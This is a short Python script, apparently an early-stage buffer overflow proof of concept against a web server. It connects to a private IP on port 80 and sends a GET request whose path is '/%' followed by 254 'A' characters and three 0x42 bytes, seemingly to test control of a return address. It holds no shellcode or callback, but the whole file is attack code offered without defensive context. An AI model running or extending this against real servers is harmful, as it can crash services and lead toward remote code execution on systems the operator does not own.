#!/usr/bin/python
import socket

target_address="172.16.73.130"
target_port=80

badbuffer = "A" * 254
badbuffer += "\x42"*3
httpmethod = "GET"

sendbuf = httpmethod + " /%" + badbuffer + '\r\n\r\n'

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(sendbuf)
sock.close()
